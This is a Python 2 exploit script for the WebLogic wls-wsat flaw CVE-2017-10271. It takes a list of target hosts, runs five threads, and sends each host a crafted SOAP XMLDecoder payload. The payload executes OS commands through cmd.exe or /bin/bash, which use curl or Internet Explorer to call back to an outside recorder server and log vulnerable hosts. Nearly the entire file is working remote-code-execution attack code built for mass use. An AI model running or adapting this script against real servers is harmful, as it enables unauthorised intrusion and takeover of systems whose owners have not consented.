#coding=utf-8
import urllib2
import threading,Queue,sys
import getopt


def usage():
    helpmsg = '''\
CVE-2017-10271 Weblogic wls-wsat Exploit
Usage: w10271.py InputFilename
        InputFile Example:
              10.0.0.1 7001 linux
              10.0.0.2 8002 windows
'''
    print helpmsg
    sys.exit()

class W10271(threading.Thread):
    def __init__(self,queue):
        threading.Thread.__init__(self)
        self._queue = queue
        self._recorder_url ='http://x.x.x.x/record/record.asp?str=ip'
        self._headers = {"User-Agent":"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0","Content-Type":"text/xml"} 
    
    def run(self):
        while True:
            if self._queue.empty():
                break
            try:
                strIP_Port_Ver = self._queue.get(timeout=0.5)
                self.w10271(strIP_Port_Ver)
            except:
                continue

    def w10271(self,ip_port_ver):
        target_list = ip_port_ver.split()
        if len(target_list)  != 3:
          return
          
        version = target_list[0]
        ip = target_list[1]
        port = target_list[2]

        strIP = ip+":"+str(port)
        recorder_url = self._recorder_url+strIP    #recorder server url

        url = "http://"+ip+":"+str(port)+"/wls-wsat/CoordinatorPortType"
        sys.stdout.write(url+'\n') 

        #如果是windows版的weblogic，则使用win_payload
        strWCmd = '"C:\Program Files (x86)\Internet Explorer\iexplore.exe" ' + recorder_url
        win_payload='<void index="0"><string>cmd.exe</string></void>\
             <void index="1"><string>/c</string></void>\
             <void index="2"><string>%s</string></void>' %strWCmd
            
        #如果是linux版的weblogic，则使用lin_payload
        strCmd = 'curl '+ recorder_url
        lin_payload='<void index="0"><string>/bin/bash</string></void>\
            <void index="1"><string>-c</string></void>\
            <void index="2"><string>%s</string></void>' % strCmd

        #拼接XML Payload
        if version == "windows":
            xml_payload = win_payload
        else:
            xml_payload = lin_payload
    
        xml_request = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">\
        <soapenv:Header>\
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">\
      <java version="1.8.0_131" class="java.beans.XMLDecoder">\
        <void class="java.lang.ProcessBuilder">\
          <array class="java.lang.String" length="3">%s</array>\
          <void method="start"/>\
        </void>\
      </java>\
    </work:WorkContext>\
          </soapenv:Header>\
          <soapenv:Body/>\
        </soapenv:Envelope>' % xml_payload

        request = urllib2.Request(url,headers=self._headers,data=xml_request)
        try:
            response = urllib2.urlopen(request)
            sys.stdout.write('========'+strIP+'=================================\n'+response.read()+'\n')
        except urllib2.URLError,e:  
            sys.stdout.write('========'+strIP+'=================================\n'+e.read()+'\n')  


def main():    
    if 1 != len(sys.argv[1:]):
    	print len(sys.argv[1:]) 
        usage()

    thread_count = 5
    threads = []
    queue = Queue.Queue()

    file = sys.argv[1]
    fh = open(file,'r')
    lines = fh.readlines()
    for line in lines:
        line = line.strip()
        if (line == '' or line[0] == '#'):
            continue
        queue.put(line)
    fh.close()

    for i in xrange(thread_count):
        threads.append(W10271(queue))

    for t in threads:
        t.start()

    for t in threads:
        t.join()

if __name__ == '__main__':
    main()